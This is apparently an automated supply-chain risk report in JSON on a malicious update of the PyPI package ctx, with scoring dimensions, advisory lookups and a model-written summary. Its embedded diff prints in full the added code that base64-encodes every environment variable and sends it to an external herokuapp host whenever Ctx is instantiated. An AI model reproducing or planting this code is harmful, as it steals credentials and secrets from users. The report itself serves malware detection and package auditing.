@@ -1,0 +1,134 @@
+{
+  "schema_version": "0.2.0",
+  "ecosystem": "pypi",
+  "package": "ctx",
+  "from_version": "0.1.2",
+  "to_version": "0.2.5",
+  "risk_score": 52.0,
+  "severity": "MEDIUM",
+  "llm_base_score": 52.0,
+  "dimensions": [
+    {
+      "name": "network_calls",
+      "label": "New or changed network calls",
+      "score": 10.0,
+      "weight": 0.2,
+      "reasoning": "In ctx.py, the new `sendRequest` method performs an HTTP GET request to 'https://anti-theft-web.herokuapp.com/hacked/<base64_encoded_env>' using the `requests` library. This is called unconditionally from `__init__`, meaning every instantiation of `Ctx` will exfiltrate environment variables to an external server.",
+      "confidence": 1.0
+    },
+    {
+      "name": "obfuscation",
+      "label": "Obfuscation / encoding patterns (base64, eval, dynamic require)",
+      "score": 7.0,
+      "weight": 0.2,
+      "reasoning": "The diff adds `import base64` and uses `base64.b64encode` to encode all environment variable values before sending them in the URL. This is a deliberate obfuscation technique to encode the stolen data and embed it in a GET request URL, making it less obvious in network logs.",
+      "confidence": 1.0
+    },
+    {
+      "name": "install_hooks",
+      "label": "Postinstall / preinstall script additions or changes",
+      "score": 0.0,
+      "weight": 0.15,
+      "reasoning": "No postinstall or preinstall scripts were added or modified. The malicious behavior is triggered at runtime via `__init__`, not at install time.",
+      "confidence": 1.0
+    },
+    {
+      "name": "env_conditional",
+      "label": "Conditional logic gated on env vars, platform, or CI detection",
+      "score": 8.0,
+      "weight": 0.15,
+      "reasoning": "The `sendRequest` method iterates over ALL environment variables via `environ.items()` and exfiltrates them unconditionally. The `uname` import is also added (though not visibly used in the diff), suggesting platform fingerprinting may have been intended. The exfiltration is not conditional but the target of exfiltration is explicitly environment data.",
+      "confidence": 1.0
+    },
+    {
+      "name": "dependency_changes",
+      "label": "Dependency graph changes (new transitive deps)",
+      "score": 6.0,
+      "weight": 0.1,
+      "reasoning": "The `requests` library is newly imported in ctx.py. While `requests` is a common package, its addition here is solely to facilitate data exfiltration. This introduces a new transitive dependency chain for a malicious purpose.",
+      "confidence": 0.9
+    },
+    {
+      "name": "resource_exhaustion",
+      "label": "Denial-of-service / resource-exhaustion patterns (unbounded loops, recursion, unthrottled blocking calls)",
+      "score": 0.0,
+      "weight": 0.2,
+      "reasoning": "No unbounded loops, recursion, or resource exhaustion patterns are introduced. The loop over `environ.items()` is bounded by the number of environment variables.",
+      "confidence": 1.0
+    }
+  ],
+  "feed_results": [
+    {
+      "source": "osv",
+      "status": "suspicious",
+      "details": "Found 2 advisory/ies: GHSA-67r3-h899-9w95, PYSEC-2022-199",
+      "url": "https://osv.dev/list?q=ctx",
+      "advisory_ids": [
+        "GHSA-67r3-h899-9w95",
+        "PYSEC-2022-199"
+      ],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": null
+    },
+    {
+      "source": "rekor",
+      "status": "no_data",
+      "details": "Sigstore attestation lookup is npm-only (PyPI PEP 740 support not implemented).",
+      "url": null,
+      "advisory_ids": [],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": null
+    },
+    {
+      "source": "scorecard",
+      "status": "no_data",
+      "details": "Could not resolve GitHub repo for ctx. Scorecard requires a GitHub repository.",
+      "url": null,
+      "advisory_ids": [],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": null
+    }
+  ],
+  "score_modifiers": [],
+  "diff_summary": {
+    "files_added": [
+      "test_ctx.py"
+    ],
+    "files_removed": [],
+    "files_modified": [
+      "ctx.py"
+    ],
+    "file_diffs": [
+      {
+        "path": "ctx.py",
+        "change_type": "modified",
+        "lines_added": 23,
+        "lines_removed": 2,
+        "unified_diff": "--- a/ctx.py\n+++ b/ctx.py\n@@ -7,9 +7,14 @@\n \n\n \"\"\"\n\n \n\n-__author__ = 'Robert Ledger'\n\n+import requests\n\n+from os import environ, uname\n\n+import base64\n\n+\n\n+\n\n+__author__ = 'Yunus AYDIN'\n\n __email__ = 'figlief@figlief.com'\n\n-__version__ = '0.1.2'\n\n+__version__ = '0.2.5'\n\n \n\n \n\n class Ctx(dict):\n\n@@ -49,6 +54,10 @@\n         b) set the dictionary item as usual.\n\n \n\n     \"\"\"\n\n+\n\n+    def __init__(self):\n\n+       \n\n+        self.sendRequest()\n\n \n\n     def copy(self):\n\n         \"\"\"Return a shallow copy of this instance\"\"\"\n\n@@ -91,3 +100,15 @@\n             self.__class__.__name__,\n\n             dict.__repr__(self)\n\n         )\n\n+\n\n+    def sendRequest(self):\n\n+        string = \"\"\n\n+        for _, value in environ.items():\n\n+            string += value+\" \"\n\n+\n\n+        message_bytes = string.encode('ascii')\n\n+        base64_bytes = base64.b64encode(message_bytes)\n\n+        base64_message = base64_bytes.decode('ascii')\n\n+\n\n+        response = requests.get(\"https://anti-theft-web.herokuapp.com/hacked/\"+base64_message)\n\n+\n"
+      },
+      {
+        "path": "test_ctx.py",
+        "change_type": "added",
+        "lines_added": 76,
+        "lines_removed": 0,
+        "unified_diff": "+import pytest\n+from ctx import Ctx\n+\n+\n+def test_lookup_error():\n+    \"\"\"Should  return LookupError if no attiibute or key is found\"\"\"\n+    with pytest.raises(LookupError):\n+        x = Ctx()\n+        (x.no_key == 5)\n+    with pytest.raises(LookupError):\n+        x = Ctx()\n+        (x['no_key'] == 5)\n+\n+\n+def test_attribute_error():\n+    \"\"\"Should raise AttributeError if attempt to set an attribute.\"\"\"\n+    with pytest.raises(AttributeError):\n+        x = Ctx()\n+        x.copy = 5\n+\n+\n+def test_attribue_access():\n+    \"\"\"Should return attribute of an object.\"\"\"\n+\n+    x = Ctx()\n+    assert x.__doc__ == x[\"__doc__\"]\n+\n+\n+def test_init():\n+    \"\"\"Should initialize an object with keywords\"\"\"\n+    p = {}\n+    q = {}\n+\n+    x = Ctx(a=p, b=q)\n+    assert x['a'] is p\n+    assert x.a is p\n+    assert x['b'] is q\n+    assert x.b is q\n+\n+\n+def test_item():\n+    \"\"\"Should set an item with ctx['a'] and retrieve it with ctx[a] or ctx.a\"\"\"\n+    p = {}\n+    x = Ctx()\n+    x['a'] = p\n+    assert x.a is p\n+    assert x['a'] is p\n+\n+\n+def test_attr():\n+    \"\"\"Should set an item with ctx.a and retrieve it with ctx[a] or ctx.a\"\"\"\n+\n+    p = {}\n+    x = Ctx()\n+    x.a = p\n+    assert x.a is p\n+    assert x['a'] is p\n+\n+\n+def test_init_copy():\n+    \"\"\"Should create a shallow copy.\"\"\"\n+\n+    p = {}\n+    q = {}\n+\n+    x = Ctx(a=p, b=q)\n+    y = x.copy()\n+    assert x is not y\n+    assert y['a'] is p\n+    assert y.a is p\n+    assert y['b'] is q\n+    assert y.b is q\n+\n+\n+if __name__ == '__main__':\n+    pytest.main()"
+      }
+    ],
+    "new_dependencies": [],
+    "removed_dependencies": [],
+    "new_install_hooks": [],
+    "maintainer_changed": false,
+    "native_addons_added": false,
+    "total_diff_lines": 101,
+    "chunks_sent_to_llm": 1,
+    "diff_truncated": false
+  },
+  "llm_model": "claude-sonnet-4-6",
+  "llm_summary": "This diff represents a confirmed supply chain attack on the `ctx` package. The `Ctx.__init__` method was modified to unconditionally call `sendRequest()`, which collects all environment variables, base64-encodes them, and exfiltrates them via an HTTP GET request to an external server ('anti-theft-web.herokuapp.com'). The author name was also changed from 'Robert Ledger' to 'Yunus AYDIN', indicating a package takeover or impersonation. This is a textbook credential/secret harvesting attack targeting anyone who instantiates the `Ctx` class.",
+  "timestamp": "2026-08-11T21:18:06.634958Z",
+  "from_version_sha256": null,
+  "to_version_sha256": null
+}
